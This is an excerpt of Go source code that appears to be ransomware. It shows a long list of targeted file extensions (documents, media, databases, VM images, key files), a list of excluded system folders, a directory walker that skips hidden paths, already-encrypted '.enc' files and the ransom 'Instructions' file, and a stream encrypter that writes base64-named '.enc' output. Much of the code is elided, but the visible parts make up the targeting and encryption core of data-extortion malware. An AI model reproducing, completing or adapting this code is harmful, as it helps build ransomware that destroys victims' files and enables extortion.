...
var exts []string = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv", ".mkv", ".mov", ".avi",
	".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC",
	...
	".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay",
	".ms11" , ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx",
...
var badfolders []string = []string{".Trash", "tmp","temp", "thumbs.db", "Recycle.Bin", "System Volume Information",
	"Boot"}
...
func Visit(path string, f os.FileInfo, err error) error {
	//NOt encrypt hidden folders
	all := strings.Split(path, "/")
	//Chehc if "." in a[:len-1]
	leng := len(all)
	for i, pathpart := range all {
		if i == leng-1 {
			break;
		}
	...
	if !strings.Contains(path, ".enc") && !strings.Contains(path, "Instructions") && !strings.Contains(path, INSTALLATION_PATH) {
...
func StreamEncrypter(path string) {
	...
	if err != nil {
		f, err := os.Create(path2+"/"+Base64Encode(filename)+".enc")
		if err != nil {
			return;
		}
		outFile = f
